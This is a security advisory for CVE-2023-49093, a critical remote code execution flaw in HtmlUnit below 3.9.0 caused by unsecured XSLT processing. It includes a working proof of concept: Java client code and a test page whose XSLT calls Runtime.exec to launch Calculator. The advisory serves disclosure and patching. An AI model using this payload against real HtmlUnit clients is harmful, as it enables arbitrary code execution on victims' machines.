# HtmlUnit vulnerable to Remote Code Execution (RCE) via XSTL

**GHSA**: GHSA-37vq-hr2f-g7h7 | **CVE**: CVE-2023-49093 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-94

**Affected Packages**:
- **org.htmlunit:htmlunit** (maven): < 3.9.0

## Description

### Summary
HtmlUnit 3.8.0 are vulnerable to Remote Code Execution (RCE) via XSTL, when browsing the attacker’s webpage

### Details
Vulnerability code location:
org.htmlunit.activex.javascript.msxml.XSLProcessor#transform(org.htmlunit.activex.javascript.msxml.XMLDOMNode)

The reason for the vulnerability is that it was not enabled FEATURE_SECURE_PROCESSING for the XSLT processor

### PoC
pom.xml:
```
<dependency>
  <groupId>org.htmlunit</groupId>
  <artifactId>htmlunit</artifactId>
  <version>3.8.0</version>
</dependency>
```

code:
```
WebClient webClient = new WebClient(BrowserVersion.INTERNET_EXPLORER);
HtmlPage page = webClient.getPage("http://127.0.0.1:8080/test.html");
System.out.println(page.asNormalizedText());
```

test.html:
```
<script>
    var xslt = new ActiveXObject("Msxml2.XSLTemplate.6.0");
    var xslDoc = new ActiveXObject("Msxml2.FreeThreadedDOMDocument.6.0");
    var xslProc;
    xslDoc.async = false;
    xslDoc.loadXML(`<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
   <xsl:template match="/">
     <xsl:variable name="rtobject" select="rt:getRuntime()"/>
     <xsl:variable name="process" select="rt:exec($rtobject,'open -a Calculator')"/>
     <xsl:variable name="processString" select="ob:toString($process)"/>
     <span><xsl:value-of select="$processString"/></span>
   </xsl:template>
 </xsl:stylesheet>`)

    if (xslDoc.parseError.errorCode != 0) {
        var myErr = xslDoc.parseError;
        document.write("ParseError: "+myErr.reason);
    } else {
        xslt.stylesheet = xslDoc;
        var xmlDoc = new ActiveXObject("Msxml2.DOMDocument.6.0");
        xmlDoc.async = false;
        xmlDoc.loadXML("<s></s>");
        if (xmlDoc.parseError.errorCode != 0) {
            var myErr = xmlDoc.parseError;
            document.write("Document error: " + myErr.reason);
        } else {
            xslProc = xslt.createProcessor();
            xslProc.input = xmlDoc;
            xslProc.transform();
            document.write(xslProc.output);
        }
    }
</script>
```


### Impact
Remote Code Execution
